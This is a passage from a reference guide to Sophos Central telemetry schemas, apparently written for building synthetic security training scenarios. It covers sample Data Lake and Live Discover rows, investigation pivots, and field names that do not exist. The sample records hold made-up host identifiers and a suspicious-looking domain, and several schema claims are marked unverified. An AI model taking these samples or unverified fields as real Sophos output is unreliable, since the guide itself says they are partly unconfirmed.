  "meta_boot_time": 1790662218,
  "meta_eid": "c58e2a1d-7f3b-4c96-a0e4-1b9d6f2c8a37",
  "meta_endpoint_type": "computer",
  "meta_ip_mask": "255.255.255.0",
  "meta_mac_address": "3c:52:82:a1:6f:0d",
  "meta_os_name": "Microsoft Windows 11 Enterprise",
  "meta_os_platform": "windows",
  "meta_os_type": "",
  "meta_os_version": "10.0.26100",
  "meta_public_ip": "213.57.121.34",
  "meta_query_pack_version": "1.31.2.4",
  "meta_username": "NEXACORP\\dana.levi",
  "counter": 41,
  "epoch": 1790662219,
  "numerics": false,
  "osquery_action": "added",
  "unix_time": 1790669680,
  "customer_id": "a7d3c1e9-5b2f-4e60-8c14-9f2a6b3d0e75"
}
```

(Column set = the official guide's query. Value types of `*_rep_data` / `ml_score_data` and `uid`/`gid` on Windows
are **UNVERIFIED**.)

### 4.7 DNS / network / file-write telemetry — UNVERIFIED native form

Sophos has no documented streamed raw DNS/connection/file-write event. That data exists only as (a) Live Discover
endpoint tables queried on demand (`sophos_dns_journal`, `sophos_ip_journal`, `sophos_process_journal`,
`sophos_file_journal` …) and (b) Data Lake hydration rows for other `query_name` values whose column sets are not
publicly documented. Confirmed-only columns (community SQL), shown as a Live Discover result row:

```json
{"time": "1790669663", "sophosPID": "7412:134351432624019871", "name": "cdn-update-sync.com"}
```

Treat anything beyond these keys as **UNVERIFIED**; for training scenarios that need Sophos-sourced C2/DNS evidence
prefer the IPS event (4.3) and the Detections API `rawData`.

---

## 5. Investigation notes

- **Device pivot**: `endpoint_id` (SIEM events/alerts) = `device.id` / `rawData.meta_eid` (Detections) =
  `endpoint_id` / `meta_eid` (Data Lake). Host name: `location` (SIEM) = `device.entity` / `meta_hostname`.
- **Process pivot**: `sophos_pid` (`<pid>:<FILETIME>`) is the unique process key; child's `parent_sophos_pid` /
  `process_parent_sophos_pid` = parent's `sophos_pid`. OS `pid` alone is ambiguous. SIEM AMSI/IPS events carry only OS
  PIDs (`processId`, `executablePid`) as strings.
- **Event ↔ alert**: alert `id` / `event_service_event_id` = event `id`; alert `description` = event `name`.
- **Hashes**: SIEM `appSha256`; Detections `rawData.process_sha256` (+`intelixFileReputation`); Data Lake `sha256`.
- **Remediation status**: `core_remedy_items.items[].result` (event) and `data.threat_status` (alert) tell whether
  cleanup succeeded (`SUCCESS` / `CLEANED_UP`) or the analyst must act (`CLEANUP_FAILED`, `NOT_CLEANUPABLE`,
  `REBOOT_REQUIRED`).
- **Console vocabulary**: Sophos Central → *Alerts*, *Events* (Logs & Reports → Events), *Threat Analysis Center* →
  *Detections*, *Threat Graphs* (formerly "Threat Cases"), *Investigations*, *Live Discover*, *Live Response*, *Search*
  (Data Lake), *Isolate* (endpoint isolation), *Cases* (MDR / XDR cases). Detection technologies: Deep Learning (ML),
  CryptoGuard (anti-ransomware), HitmanPro.Alert exploit mitigation (HMPA), AMSI protection, Malicious Traffic
  Detection (MTD), IPS, Behavioural (HBT/runtime).

---

## 6. Common mistakes / fields that do NOT exist

- Presenting the **SIEM-script output** as native: `dhost`, `suser`, `duid`, `rt`, `end`, `datastream`,
  `detection_identity_name`, `filePath` are added/renamed by `Sophos-Central-SIEM-Integration`; the API item has
  `location`, `source`, `user_id`, `created_at`, `when` and no `datastream`.
- Inventing raw-telemetry events: Sophos SIEM API has no `ProcessCreated`, `NetworkConnection`, `DnsQuery`,
  `FileWritten` event types, and no `process.command_line` / `cmdline` field on SIEM events. Command lines appear only
  in Detections `rawData.process_cmd_line` and Data Lake `cmdline`.
- Event `type` strings always start `Event::` and use `::` separators (`Event::Endpoint::Threat::Detected`) — not
  `Endpoint.Threat.Detected`, not `ThreatDetected`.
- `severity` on SIEM items is a lower-case word; on Detections it is an integer 0–10. Don't put `"severity":"High"` on
  a detection or `"severity":8` on a SIEM event.
- Fields that do not exist: `sophos.threat_name`, `threat_name`, `hostname` (SIEM uses `location`), `endpoint_name`,
  `computer_name`, `action:"blocked"` (use `core_remedy_items`/`threat_status`), `mitre_technique` on SIEM events
  (MITRE is only on Detections `mitreAttacks`).
- Don't mix console Search field names (`command_line`, `dest_ip`, `sophos_process_id`, `process_username`) into Data
  Lake rows — raw columns are `cmdline`, `sophos_pid`, `username`, and network columns differ per `query_name`.
- Legacy: the old Sophos Central SIEM script used an API-key header (`x-api-key` + `Authorization: Basic`) against
  the same `/siem/v1/*` endpoints; the item shape is the same. The Classic XDR Detections REST API is deprecated in
  favour of the Detections GraphQL API (GraphQL field names **UNVERIFIED**); "Threat Cases" were renamed "Threat Graphs".
